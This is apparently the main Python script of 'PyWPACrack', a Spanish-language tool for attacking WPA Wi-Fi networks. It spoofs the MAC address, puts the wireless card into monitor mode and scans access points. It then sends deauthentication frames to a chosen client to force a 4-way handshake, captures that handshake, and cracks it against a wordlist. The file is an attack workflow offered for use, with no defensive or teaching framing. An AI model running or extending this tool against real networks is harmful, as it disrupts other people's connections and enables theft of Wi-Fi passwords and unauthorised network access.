
from signal import signal, SIGINT, SIGTSTP
from time import sleep, perf_counter

from multiprocessing import cpu_count

from core.get_clients import get_aps_recursive, get_clients
from core.hw import get_iws, monitor_mode, managed_mode,change_channel, gen_random_mac, change_mac, system
from core.commands import capture_data, deauth, crack
from core.install_drivers import has_connection, upgrade, install_essentials, install_driver 

from utils import _get_response, verify_pathdir, get_wordlist, IS_ROOT
from utils.colorize import colorize, banner


def _signal_handler(signal, frame):
    print()
    if signal == SIGINT:
        colorize("Programa interrumpido.", level='info')
    else:
        colorize("Programa detenido.", level='info')
    iface_name=globals().get('iface_name')

    if iface_name:
        colorize(f"Desactivando modo monitor en '{iface_name}'", level='info')
        managed_mode(iface_name)
    exit(0)

def _get_iface(ifaces):
    while True:
        colorize('Interfaces disponibles: ', level='info')
        count=0
        for iface in ifaces:
            print(f"[{count}] {iface['iw_name']}")
            count+=1

        try:
            iface_num=int(input('Por favor, seleccione una interfaz: '))
            iface_name=ifaces[iface_num]['iw_name'].strip()
            return iface_name
        except ValueError:
            colorize('Por favor, eliga un numero!', level='error', clear=True)
        except IndexError:
            colorize('Por favor, seleccione un NIC correcta!', level='error', clear=True)

def _get_ap(aps):
    while True:
        colorize('APs disponibles: ', level='info')
        count=0
        for ap in aps:
            print(f"[{count}] {ap['data'][0]}   Crypt: {ap['data'][3]}   Channel: {ap['data'][2]}")
            count+=1

        try:
            ap_num=int(input('Por favor, seleccione un AP: '))
            ap_data=aps[ap_num]
            return ap_data
        except ValueError:
            colorize('Por favor, eliga un numero!', level='error', clear=True)
        except IndexError:
            colorize('Por favor, seleccione un AP correcto!', level='error', clear=True)

def _get_client(clients):
    while True:
        colorize('Clientes disponibles: ', level='info')
        count=0
        for client in clients:
            print(f"[{count}] {client}")
            count+=1

        try:
            raw=input('Por favor, seleccione un cliente o enter para reescanear: ').strip()
            if raw == '':
                return raw

            ap_num=int(raw)
            ap_data=clients[ap_num]
            return ap_data
        except ValueError:
            colorize('Por favor, eliga un numero!', level='error', clear=True)
        except IndexError:
            colorize('Por favor, seleccione un Cliente correcto!', level='error', clear=True)

def main():
    banner('PyWPACrack', author='D3Crypt3r', version='4.0')
    try:
        signal(SIGINT, _signal_handler)
        signal(SIGTSTP, _signal_handler)
        
        if not IS_ROOT:
            colorize('Se requiere de permisos root!', level='error', _exit=True)

        ifaces=get_iws()
        if len(ifaces) == 0:
            colorize('Se requiere al menos una interfaz de red!', level='error', _exit=True)
        
        global iface_name
        iface_name=_get_iface(ifaces)

        macchange=_get_response('¿Desea cambiar la MAC por una aleatoria?: ', ['Si', 'No'], 'Eliga una opcion: ').lower()
        if macchange == 'si':
            sleep(4)
            new_mac=gen_random_mac()
            colorize(f'Cambiando MAC de {iface_name} a {new_mac}!', level='info')
            mac_output=change_mac(iface_name, new_mac)
            if mac_output[1].strip() == '':
                colorize(f'No se pudo cambiar la MAC de {iface_name}', level='error')
            else:
                colorize(f'Se cambio la MAC de {iface_name} a {new_mac}!', level='success')

        def verify_mode_monitor():
            colorize(f'Poniendo interfaz \'{iface_name}\' en modo monitor!', level='info')
            has_mode_monitor=monitor_mode(iface_name)
            if not has_mode_monitor[0]:
                not_drivers='null' in has_mode_monitor[1]
                airmon_bussy='Error -16 likely means your card was set back to station mode by something' in has_mode_monitor[1]
                colorize(f'Error al intentar poner la NIC {iface_name} en modo monitor!', level='error', _exit=not not_drivers or not airmon_bussy)

                if airmon_bussy:
                    system(f'sudo airmon-ng stop {iface_name}')
                    verify_mode_monitor()
                else:
                    if not has_connection():
                        colorize(f'Se necesita de conexion a internet para poder instalar los drivers necesarios!', level='error', _exit=True)

                    install_drivers=_get_response('Instalar drivers: ', ('Si', 'No'), '¿Desea instalar los drivers necesarios?: ')
                    if install_drivers:
                        colorize('Realizando la actualizacion de repositorios y herramientas...', level='info', clear=True)
                        upgrade()
                        colorize('Instalando herramientas para compilar los drivers...', level='info', clear=True)
                        install_essentials()
                        colorize('Compilando e instalando custom driver...', level='info', clear=True)
                        install_driver()
                        colorize('Reiniciando sistema para aplicar cambios...', level='info', clear=True, timeout=4)
                        system("sudo systemctl reboot")

                    else:
                        exit(0)
        verify_mode_monitor()

        colorize('Obteniendo APs, por favor espere unos segundos...', level='info')
        aps=get_aps_recursive(iface_name)

        ap_data=_get_ap(aps)
        ap_bssid=ap_data['bssid']
        ap_ssid=ap_data['data'][0]
        ap_channel=ap_data['data'][2]

        colorize(f'Cambiando canal a {ap_channel}...', level='info')
        change_channel(iface_name, ap_channel)

        mac_client=''
        while mac_client == '':
            colorize(f'Obteniendo clientes de \'{ap_ssid}\' con MAC {ap_bssid}...', level='info')
            clients=get_clients(iface_name, ap_bssid)

            mac_client=_get_client(clients)       

        path_cap=verify_pathdir()

        colorize(f'Desauthenticanto al cliente {mac_client} de {ap_bssid}', level='info')
        deauth(iface_name, ap_bssid, mac_client)

        colorize(f'Capturando 4 way-handshake(cerrar ventana cuando se muestre: WPA handshake: xx:xx:xx:xx:xx:Xx)', level='info')
        capture_data(iface_name, path_cap, ap_channel, ap_bssid)
        deauth(iface_name, ap_bssid, mac_client)

        
        path_wordlist=get_wordlist()
        num_passwords=len(open(path_wordlist).read().splitlines())
        start_crack=perf_counter()
        colorize(f'Iniciando crackeo con {num_passwords} contraseñas, usando {cpu_count()} nucleos...', level='info')
        crack(path_cap, path_wordlist)

        print()
        colorize(f"Tiempo tomado: {round(perf_counter() - start_crack)}.s .")
        
        colorize(f"Restaurando NIC '{iface_name}' a modo managed e iniciando NetworkManager.", level='info')
        managed_mode(iface_name)

    except Exception as e:
        colorize(f"Restaurando NIC '{iface_name}' a modo managed e iniciando NetworkManager.", level='info')
        managed_mode(iface_name)
        colorize(repr(e), level='error', _exit=True)

if __name__ == '__main__':
    main()